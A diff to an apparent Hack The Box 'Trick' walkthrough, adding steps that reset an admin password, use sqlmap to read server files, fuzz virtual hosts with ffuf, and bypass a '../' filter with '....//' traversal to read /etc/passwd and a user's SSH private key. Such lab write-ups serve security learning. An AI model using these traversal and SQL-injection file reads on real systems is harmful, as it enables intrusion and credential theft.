@@ -69,7 +69,7 @@ Notes:
 
 #### Visual Inspection
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (3).png" alt=""><figcaption></figcaption></figure>
 
 #### ffuf Subdomain Enumeration
 
@@ -180,13 +180,90 @@ root.trick.htb
 
 * We now have access to the administrator's page
 
-<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+
+Upon going to the users tab, you can modify the password for the Administrator account so we can freely authenticate as the admin.
+
+Credentials:
+
+```
+Enemigosss:password1
+```
+
+There is literally nothing else for us to do. I have seemingly done everything to enumerate this box. Let's try to find another subdomain. It is safe to assume that there may be another subdomain after "preprod-" due to its interesting naming convention.
+
+#### Finding the third subdomain with sqlmap
+
+```
+sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/etc/nginx/sites-enables/default --threads 10
+```
+
+* Inside will be server\_name <mark style="color:yellow;">preprod-marketing.trick.htb</mark>
+
+#### ffuf fuzzing
+
+```
+ffuf -c -u http://preprod-payroll.trick.htb/ -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -H "Host: preprod-FUZZ.trick.htb" -ms 9660
+
+[Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 37ms]
+    * FUZZ: marketing
+```
+
+* We find a new subdomain called "marking"
+* <mark style="color:yellow;">preprod-marketing.trick.htb is our third subdomain add it to /etc/hosts</mark>
+
+#### preprod-marketing.trick.htb enumeration
+
+#### Visual Inspection
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+* It appears to be a very basic site, not much is going on here
+* However, if we go to a different page such as Services, we can see that the URL bar appends `index.php?page=` at the top
+* Let's test for LFI
+* The typical ../../../etc/passwd fails there is probably a form of sanitizing occurring
+
+Let's find out why this is happening:
+
+#### Obtaining index.php file for server-side input handling:
+
+```
+sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege --file-read=/var/www/market/index.php --threads 10
+```
+
+<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+In here, we see that PHP is using .str\_replace for ../ which is impacting our LFI attack. However, what if we stack our ../'s and we try again?
 
 ## Exploitation
 
-### Name of the technique
+### Local File Inclusion (LFI)
 
-This is the exploit
+Upon finding source code for the PHP code for the website from SQLi, we can exploit LFI on the site:
+
+```
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
+```
+
+<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+
+Grabbing Michael's SSH Private Key:
+
+```
+http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//home/michael/.ssh/id_rsa
+```
+
+<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+
+* After putting the private key in an id\_rsa file, we need to `chmod 600` this file and authenticate to the server via SSH
+
+#### SSH Attempt as Michael:
+
+```
+ssh -i id_rsa michael@trick.htb
+```
+
+<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
